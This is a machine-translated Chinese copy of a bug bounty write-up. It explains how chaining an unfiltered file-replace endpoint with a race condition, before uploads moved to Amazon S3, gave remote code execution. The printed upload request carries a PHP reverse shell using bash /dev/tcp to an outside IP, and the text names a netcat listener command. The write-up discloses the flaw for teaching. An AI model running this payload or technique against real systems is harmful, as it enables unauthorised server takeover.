<html>
<head>
<title>Race Condition that could Result to RCE - (A story with an App that temporary stored an uploaded file within 2 seconds before moving it to Amazon S3)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">可能导致RCE的竞争条件-(一个应用程序在将上传的文件移动到亚马逊S3之前，在2秒内临时存储该文件的故事)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/race-condition-that-could-result-to-rce-a-story-with-an-app-that-temporary-stored-an-uploaded-9a4065368ba3?source=collection_archive---------0-----------------------#2019-09-14">https://infosecwriteups.com/race-condition-that-could-result-to-rce-a-story-with-an-app-that-temporary-stored-an-uploaded-9a4065368ba3?source=collection_archive---------0-----------------------#2019-09-14</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="7a59" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi">بسم الله الرحمن الرحيم</p><p id="073e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">-第一部分从(希望)第四部分-</p></div><div class="ab cl kl km hu kn" role="separator"><span class="ko bw bk kp kq kr"/><span class="ko bw bk kp kq kr"/><span class="ko bw bk kp kq"/></div><div class="ij ik il im in"><p id="f940" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">更新一:</strong>增加了“参考”一节。</p><p id="18d8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">更新二:</strong>“我们”在这一系列文章中将指<a class="ks kt ep" href="https://medium.com/u/52fda4dd4a36?source=post_page-----9a4065368ba3--------------------------------" rel="noopener" target="_blank">费萨尔·尤多·赫纳万</a>、<a class="ks kt ep" href="https://medium.com/u/209be6f96c99?source=post_page-----9a4065368ba3--------------------------------" rel="noopener" target="_blank">孙铁麟</a>和我。</p><p id="4ca4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">更新三:</strong>利用“upload.php”函数的方法已经在孙铁麟的文章中<a class="ae ku" href="https://medium.com/@mastomi/bug-bounty-exploiting-cookie-based-xss-by-finding-rce-a3e3e80041f3" rel="noopener">发布。它可以绕过。phtml扩展。</a></p><p id="06c2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">更新IV: </strong>我们选择这些目标(具有存储XSS问题的目标)的原因，已经在本文中发布了(来自导致许多bug 的注册激活的简单旁路<a class="ae ku" href="https://medium.com/bugbountywriteup/a-simple-bypass-of-registration-activation-that-lead-to-many-bug-a-story-about-how-my-friend-5df0889f1062" rel="noopener">)。</a></p></div><div class="ab cl kl km hu kn" role="separator"><span class="ko bw bk kp kq kr"/><span class="ko bw bk kp kq kr"/><span class="ko bw bk kp kq"/></div><div class="ij ik il im in"><h2 id="8d9f" class="kv kw iq bd kx ky kz dn la lb lc dp ld jy le lf lg kc lh li lj kg lk ll lm ln bi translated"><strong class="ak">一、简介</strong></h2><p id="b80a" class="pw-post-body-paragraph jn jo iq jp b jq lo js jt ju lp jw jx jy lq ka kb kc lr ke kf kg ls ki kj kk ij bi translated"><strong class="jp ir"> 1.1。关于这篇文章的几个字</strong></p><p id="8674" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">作为参考，这篇简单的文章讲述了一个故事，讲述了我如何在一个私有程序中链接几个bug，从简单的recon到简单的SQL注入、竞争条件，最后导致RCE。既然发现的RCE是独一无二的，那么，这个简单的记录将从一个由竞争条件触发的RCE开始。另外一个会在晚些时候被释放。</p><h2 id="0be2" class="kv kw iq bd kx ky kz dn la lb lc dp ld jy le lf lg kc lh li lj kg lk ll lm ln bi translated"><strong class="ak"> 1.2。简单总结</strong></h2><p id="5d7a" class="pw-post-body-paragraph jn jo iq jp b jq lo js jt ju lp jw jx jy lq ka kb kc lr ke kf kg ls ki kj kk ij bi translated">有些读者可能更喜欢摘要。然后在这一部分，我们将解释与我们获得RCE的“旅程”相关的整个总结。</p><p id="83c6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当我们访问管理员的内部仪表板时(通过使用从SQL注入结果中转储的帐户)，我们发现了应用程序中的上传功能。</p><p id="d0ed" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">基本上，这个应用程序有一个保护机制，不允许用户上传。php扩展(比方说，函数是<strong class="jp ir">upload.php</strong>-<strong class="jp ir"/>)以前，上传。phtml扩展)。但是，当这个应用程序提供另一个功能(姑且称之为<strong class="jp ir">modify.php</strong>)来替换/删除之前上传的文件时，第一个独特的问题就来了。好的一面是，这个modify.php函数不像upload.php那样过滤任何扩展名。因此，我们可以轻松地上传。php文件放入站点。</p><p id="d085" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是，当应用程序将上传的文件转移到S3桶时，我们就遇到了问题。换句话说，不可能在应用服务器上获得RCE，因为外壳存储在S3桶(也没有工作)。</p><p id="1361" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在一种情况下，我们尝试多次重新发送上传请求(通过使用那些modify.php函数)(就像一种竞争情况)，突然我们得到了一个不同的响应长度，其中包含本地存储路径信息的错误。从这次执行中，我们意识到，如果文件在自动移动到S3存储桶之前大约2秒钟存储在本地。</p><p id="7871" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，下一步是，我们在我们的服务器上设置侦听器(通过简单地使用“nc -lvp listener_port”)，然后尝试再次执行相同的竞争条件(在modify.php函数处重新上传反向shell)，最后并行地，我们请求先前在我们的浏览器中找到的本地存储路径(就像我们多次按下“Command + R”)，直到我们的终端从应用程序的服务器显示shell。</p><p id="b64f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">经过几次请求(不知何故超过20-30次请求)，我们终于得到了应用服务器的外壳。</p><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="lz ma di mb bf mc"><div class="gh gi lt"><img src="../Images/36d0dde0cf83aae8dde67dfdfdbfe09b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_MyQRp8H4czAZ9ZZy1T0yQ.png"/></div></div><figcaption class="mf mg gj gh gi mh mi bd b be z dk translated">图1 RCE结果</figcaption></figure></div><div class="ab cl kl km hu kn" role="separator"><span class="ko bw bk kp kq kr"/><span class="ko bw bk kp kq kr"/><span class="ko bw bk kp kq"/></div><div class="ij ik il im in"><h2 id="edee" class="kv kw iq bd kx ky kz dn la lb lc dp ld jy le lf lg kc lh li lj kg lk ll lm ln bi translated"><strong class="ak">二。关于RCE的详细故事</strong></h2><p id="b32d" class="pw-post-body-paragraph jn jo iq jp b jq lo js jt ju lp jw jx jy lq ka kb kc lr ke kf kg ls ki kj kk ij bi translated">在这一部分，我们将试着一步一步地解释我们最终是如何得到RCE的。</p><p id="b2bc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">仅供参考，我们尽量手动绘制界面草图，希望能帮助读者了解情况。</p><h2 id="17bb" class="kv kw iq bd kx ky kz dn la lb lc dp ld jy le lf lg kc lh li lj kg lk ll lm ln bi translated">2.1.面向内部仪表板—满足上传功能</h2><p id="29ce" class="pw-post-body-paragraph jn jo iq jp b jq lo js jt ju lp jw jx jy lq ka kb kc lr ke kf kg ls ki kj kk ij bi translated">所以，在我们获得了内部仪表盘的访问权限后(稍后将公布我们是如何获得它的)，我们并没有停止搜寻。在这一点上，然后我们试图寻找任何文件上传功能，可能存在的应用程序。几分钟后，我们终于发现了一个可以通过这个仪表板发布新闻/文章的功能。然后，我们了解到，如果每个文件，我们想上传到每一个可用的部分(新闻/文章或任何东西)，那么它将被称为upload.php的功能处理。</p><p id="7c35" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">基本上，每个可用部分都有一个上传界面，如下所示:</p><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="lz ma di mb bf mc"><div class="gh gi mj"><img src="../Images/729f4ab13557eaeeda73bd55180d48b4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OoLpu4eAJ6pbNQDeuGqztg.png"/></div></div><figcaption class="mf mg gj gh gi mh mi bd b be z dk translated">图2上传功能界面</figcaption></figure><p id="3076" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">没有想太多，那我们直接上传简单的。php外壳再次通过这个功能(<a class="ae ku" href="https://medium.com/@mastomi/bug-bounty-exploiting-cookie-based-xss-by-finding-rce-a3e3e80041f3" rel="noopener">)以前，它容易受到通过给。phtml扩展</a>并固定。然后我们又试着测试了一下这个功能)。但事情并不顺利，该功能有一个保护过滤。php扩展。我们试图将扩展名与大写&amp;小写(例如:。PhP)，还在扩展名后面加了一些数字(例如:. php3)，并尝试了各种方式(据我们所知——加倍扩展名，空字符，添加；性格等等)来绕过保护，那么它就失败了。我们总是收到这个可爱的警告。</p><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="lz ma di mb bf mc"><div class="gh gi mk"><img src="../Images/73b3b584719f545a0e6481b94cfbbf94.png" data-original-src="https://miro.medium.com/v2/resize:fit:780/format:webp/1*lcyP2P4tHl-KUvxiDocQ2w.png"/></div></div><figcaption class="mf mg gj gh gi mh mi bd b be z dk translated">图3应用中的保护</figcaption></figure><p id="d60b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后我们想，如何存储XSS，比如也许上传。html，。xml，或者。svg格式？嗯，这张上传成功。但后来，我们意识到如果文件被转移到S3桶。那么，如果我们能在S3桶域触发XSS又有什么意义呢？好吧，因为我们不知道如何进一步“使用”它，那么我们假设这不是一个问题。</p><h2 id="b269" class="kv kw iq bd kx ky kz dn la lb lc dp ld jy le lf lg kc lh li lj kg lk ll lm ln bi translated">2.2.满足第二个上传功能，Modify.php</h2><p id="1300" class="pw-post-body-paragraph jn jo iq jp b jq lo js jt ju lp jw jx jy lq ka kb kc lr ke kf kg ls ki kj kk ij bi translated">下一步是什么？在我们不知道如何将“上传”的文件“使用”到S3桶中之后，我们又回到了“新闻”部分的第一页，它包含了如此多需要添加新内容的表格。</p><p id="0b65" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">仔细查看后，我们意识到在上传到S3存储桶的合法文件的同一行是否有一个“编辑”按钮。</p><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="lz ma di mb bf mc"><div class="gh gi ml"><img src="../Images/16889360f7626889bae2f360d8d2c8fb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YgywGJhldxYZEMBcimXN-Q.png"/></div></div><figcaption class="mf mg gj gh gi mh mi bd b be z dk translated">图4功能编辑/删除上传的文件</figcaption></figure><p id="7ec3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">此时，我们试着点击“编辑”按钮，看看会发生什么。</p><p id="09de" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">正如所料，我们将在这一部分也面临上传功能。第一次看到它时，我们认为这种形式是在过滤。php扩展也是(因为我们认为，它与第一个有什么不同？).<strong class="jp ir">但是，令人惊讶的是</strong>，这个上传功能还没有过滤任何扩展名。</p><p id="4c66" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">简而言之，我们可以上传。php文件直接没有遇到任何麻烦。</p><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="lz ma di mb bf mc"><div class="gh gi ml"><img src="../Images/143bcdb618343d29d1d5e5b6fb91e738.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wE-1SGhRhJ7--aLnk1IoPw.png"/></div></div><figcaption class="mf mg gj gh gi mh mi bd b be z dk translated">图5上传替换现有文件的功能</figcaption></figure><p id="d5d1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当我们的shell被上传后，我们尝试重新上传shell并找出使用的函数。如果这一个还没有任何过滤功能，那么如果这是与先前不同的功能，可能性很大。我们的假设是正确的。在这个端点使用的函数是“【modify.php】”而不是“<strong class="jp ir">【upload.php】</strong>”。下面是用“modify.php”发出的示例请求:</p><pre class="lu lv lw lx gt mm mn mo mp aw mq bi"><span id="715a" class="kv kw iq mn b gy mr ms l mt mu">Content-Disposition: form-data; name="fileid"</span><span id="a180" class="kv kw iq mn b gy mv ms l mt mu">31337</span><span id="b053" class="kv kw iq mn b gy mv ms l mt mu">-----------------------------09234599689937136550676151776</span><span id="096f" class="kv kw iq mn b gy mv ms l mt mu">Content-Disposition: form-data; name="name"</span><span id="4686" class="kv kw iq mn b gy mv ms l mt mu">picture-1.png</span><span id="7f21" class="kv kw iq mn b gy mv ms l mt mu">-----------------------------09234599689937136550676151776</span><span id="b709" class="kv kw iq mn b gy mv ms l mt mu">Content-Disposition: form-data; name="description"</span><span id="8446" class="kv kw iq mn b gy mv ms l mt mu">-----------------------------09234599689937136550676151776</span><span id="0622" class="kv kw iq mn b gy mv ms l mt mu">Content-Disposition: form-data; name="userfile"; filename="reverse.php"</span><span id="34c9" class="kv kw iq mn b gy mv ms l mt mu">Content-Type: text/php</span><span id="2c7e" class="kv kw iq mn b gy mv ms l mt mu">&lt;?php</span><span id="8d54" class="kv kw iq mn b gy mv ms l mt mu">exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.20.30.40/21234 0&gt;&amp;1'");</span><span id="0313" class="kv kw iq mn b gy mv ms l mt mu">-----------------------------09234599689937136550676151776</span><span id="6358" class="kv kw iq mn b gy mv ms l mt mu">Content-Disposition: form-data; name="save"</span><span id="b744" class="kv kw iq mn b gy mv ms l mt mu">Save</span></pre><p id="f3c6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">那么，结束了吗？<strong class="jp ir">好难过，还没</strong>。的。php文件也被转移到S3桶，我们不能对上传的文件做任何事情。</p><h2 id="ad0c" class="kv kw iq bd kx ky kz dn la lb lc dp ld jy le lf lg kc lh li lj kg lk ll lm ln bi translated">2.3.获取本地路径的竞争条件</h2><p id="d560" class="pw-post-body-paragraph jn jo iq jp b jq lo js jt ju lp jw jx jy lq ka kb kc lr ke kf kg ls ki kj kk ij bi translated">老实说，那时我们也不知道，直到我们最终尝试用“空”有效载荷多次发送请求(通过burpsuite的入侵者模式)。请不要问，我们为什么这样做。</p><p id="8832" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">令人惊讶的是，在发出几个请求后，我们得到了不同的响应长度(大约需要10个请求，超过20-30个请求)。如果正常请求会产生1147个响应长度，那么在某一点上，它会达到<strong class="jp ir"> 1710个</strong>响应长度。</p><p id="b43a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">以下是我们所做的“相同”多重请求的示例:</p><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="lz ma di mb bf mc"><div class="gh gi mw"><img src="../Images/69b9cae6feea4cc76d560f657507fd0c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aX_Ixc_YMgoFf-qE9Jv4uQ.png"/></div></div><figcaption class="mf mg gj gh gi mh mi bd b be z dk translated">图6发送具有空有效负载的多个请求</figcaption></figure><p id="abda" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下面是我们通常会得到的正常响应(1147个响应长度):</p><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="lz ma di mb bf mc"><div class="gh gi mx"><img src="../Images/93ef55576bf3a000a7d575072ad6476f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MO4Jzf62QKVdF4z5_9IWfg.png"/></div></div><figcaption class="mf mg gj gh gi mh mi bd b be z dk translated">图7响应长度为1147的正常响应</figcaption></figure><p id="b90d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">那么，我们得到的非正常响应长度的内容是什么呢？好的一点是，它揭示了文件的本地路径。</p><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="lz ma di mb bf mc"><div class="gh gi my"><img src="../Images/9c98d32af2df63303fac7f8227d918c5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jhpch7QePn-LWxS612DpiQ.png"/></div></div><figcaption class="mf mg gj gh gi mh mi bd b be z dk translated">图8竞争条件揭示了局部路径</figcaption></figure><p id="77a3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">当我们看到这个结果时，最后我们想，如果我们只需要在浏览器中访问路径，并等待侦听器触发shell。</p><p id="d4dd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">但是又一次，很难过，不是那样的。当通过我们的浏览器访问该文件时，我们得到了著名的警报:<strong class="jp ir">“文件未找到”</strong>。如果我们检查已经上传的文件的路径，它仍然显示S3存储桶位置，而不是我们从这个错误中得到的本地路径。</p><p id="5aa4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，从这次执行中，我们了解到，在他们将文件自动移动到S3存储桶之前，文件是否以某种方式存储在本地大约1-2秒钟。</p><h2 id="563f" class="kv kw iq bd kx ky kz dn la lb lc dp ld jy le lf lg kc lh li lj kg lk ll lm ln bi translated">2.4.触发外壳，得到一个RCE</h2><p id="7c68" class="pw-post-body-paragraph jn jo iq jp b jq lo js jt ju lp jw jx jy lq ka kb kc lr ke kf kg ls ki kj kk ij bi translated">从最后的假设中，我们想到了一件事:“<em class="mz">如果我们再次运行竞争条件，同时请求我们找到的(从错误结果中)到浏览器的本地路径来触发反向shell，会怎么样？</em></p><p id="9627" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">怎么样？最后，<strong class="jp ir">这招很管用</strong>。</p><p id="206c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">因此，我们在我们的服务器<strong class="jp ir"> - &gt; </strong>上设置监听器，然后尝试用我们的反向外壳<strong class="jp ir"> - &gt; </strong>替换应用程序上的现有文件多次执行竞争条件(1000个请求可以缓冲我们的时间)<strong class="jp ir"> - &gt; </strong>从竞争条件执行的不同响应长度中选择本地路径<strong class="jp ir"> - &gt; </strong>通过我们的浏览器<strong class="jp ir"> - &gt; </strong>反复访问路径，当应用程序被</p><p id="015d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">下面是与执行相关的简单流程:</p><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="lz ma di mb bf mc"><div class="gh gi na"><img src="../Images/a6c5ae521faa77b82b03e20345013136.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XnbEw0LYee673XL2xwvaFA.png"/></div></div><figcaption class="mf mg gj gh gi mh mi bd b be z dk translated">图9执行流程</figcaption></figure><p id="00dc" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是RCE得出的简单结果:</p><figure class="lu lv lw lx gt ly gh gi paragraph-image"><div role="button" tabindex="0" class="lz ma di mb bf mc"><div class="gh gi nb"><img src="../Images/155341dd20b163f95d0ff389d51e97f0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RqRAFwigPWZk8Ds7H8KzLg.png"/></div></div><figcaption class="mf mg gj gh gi mh mi bd b be z dk translated">图10 RCE结果</figcaption></figure></div><div class="ab cl kl km hu kn" role="separator"><span class="ko bw bk kp kq kr"/><span class="ko bw bk kp kq kr"/><span class="ko bw bk kp kq"/></div><div class="ij ik il im in"><h2 id="b0c2" class="kv kw iq bd kx ky kz dn la lb lc dp ld jy le lf lg kc lh li lj kg lk ll lm ln bi translated">三。闭幕</h2><p id="0c9d" class="pw-post-body-paragraph jn jo iq jp b jq lo js jt ju lp jw jx jy lq ka kb kc lr ke kf kg ls ki kj kk ij bi translated">从这个bug中我们可以学到很多东西(至少对我们来说)。一些好的方面是:</p><ul class=""><li id="5898" class="nc nd iq jp b jq jr ju jv jy ne kc nf kg ng kk nh ni nj nk bi translated">我们有可能在文件本身移动到S3存储桶之前获得上传文件的本地路径。即使只有1或2秒钟，也足以让我们触发壳进入我们的听众；</li><li id="52df" class="nc nd iq jp b jq nl ju nm jy nn kc no kg np kk nh ni nj nk bi translated">总是尝试编辑你自己上传的文件。从这种情况下，我们看到，如果上传功能是从两个独立的功能(这是upload.php和modify.php在这种情况下)执行的可能性；</li><li id="f3c0" class="nc nd iq jp b jq nl ju nm jy nn kc no kg np kk nh ni nj nk bi translated">或许还有更多我们不知道的。</li></ul></div><div class="ab cl kl km hu kn" role="separator"><span class="ko bw bk kp kq kr"/><span class="ko bw bk kp kq kr"/><span class="ko bw bk kp kq"/></div><div class="ij ik il im in"><h2 id="1829" class="kv kw iq bd kx ky kz dn la lb lc dp ld jy le lf lg kc lh li lj kg lk ll lm ln bi translated">四。参考</h2><p id="9450" class="pw-post-body-paragraph jn jo iq jp b jq lo js jt ju lp jw jx jy lq ka kb kc lr ke kf kg ls ki kj kk ij bi translated">这里有一些(希望)与这篇文章相关的参考资料:</p><ul class=""><li id="2a6c" class="nc nd iq jp b jq jr ju jv jy ne kc nf kg ng kk nh ni nj nk bi translated"><a class="ae ku" href="https://www.owasp.org/index.php/Testing_for_Race_Conditions_(OWASP-AT-010)" rel="noopener ugc nofollow" target="_blank">https://www . OWASP . org/index . PHP/Testing _ for _ Race _ Conditions _(OWASP-AT-010)</a></li><li id="e896" class="nc nd iq jp b jq nl ju nm jy nn kc no kg np kk nh ni nj nk bi translated"><a class="ae ku" href="https://securingtomorrow.mcafee.com/business/testing-race-conditions-web-applications/" rel="noopener ugc nofollow" target="_blank">https://securing morrow . McAfee . com/business/testing-race-conditions-we B- applications/</a></li><li id="1cef" class="nc nd iq jp b jq nl ju nm jy nn kc no kg np kk nh ni nj nk bi translated"><a class="ae ku" href="https://medium.com/@ciph3r7r0ll/race-condition-bug-in-web-app-a-use-case-21fd4df71f0e" rel="noopener">https://medium . com/@ CIP H3 r 7 r 0 ll/race-condition-bug-in-we B- app-a-use-case-21 FD 4d f 71 f 0e</a></li><li id="4685" class="nc nd iq jp b jq nl ju nm jy nn kc no kg np kk nh ni nj nk bi translated">https://www.owasp.org/index.php/Unrestricted_File_Upload<a class="ae ku" href="https://www.owasp.org/index.php/Unrestricted_File_Upload" rel="noopener ugc nofollow" target="_blank"/></li><li id="8a1e" class="nc nd iq jp b jq nl ju nm jy nn kc no kg np kk nh ni nj nk bi translated"><a class="ae ku" href="https://www.slideshare.net/HackIT-ukraine/15-technique-to-exploit-file-upload-pages-ebrahim-hegazy" rel="noopener ugc nofollow" target="_blank">https://www . slide share . net/HackIT-Ukraine/15-technique-to-exploit-file-upload-pages-Ebrahim-he gazy</a></li></ul></div><div class="ab cl kl km hu kn" role="separator"><span class="ko bw bk kp kq kr"/><span class="ko bw bk kp kq kr"/><span class="ko bw bk kp kq"/></div><div class="ij ik il im in"><p id="1777" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="mz">关注</em> <a class="ae ku" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="mz"> Infosec报道</em> </a> <em class="mz">获取更多此类精彩报道。</em></p><div class="nq nr gp gr ns nt"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="nu ab fo"><div class="nv ab nw cl cj nx"><h2 class="bd ir gy z fp ny fr fs nz fu fw ip bi translated">信息安全报道</h2><div class="oa l"><h3 class="bd b gy z fp ny fr fs nz fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="ob l"><p class="bd b dl z fp ny fr fs nz fu fw dk translated">medium.com</p></div></div><div class="oc l"><div class="od l oe of og oc oh md nt"/></div></div></a></div></div></div>    
</body>
</html>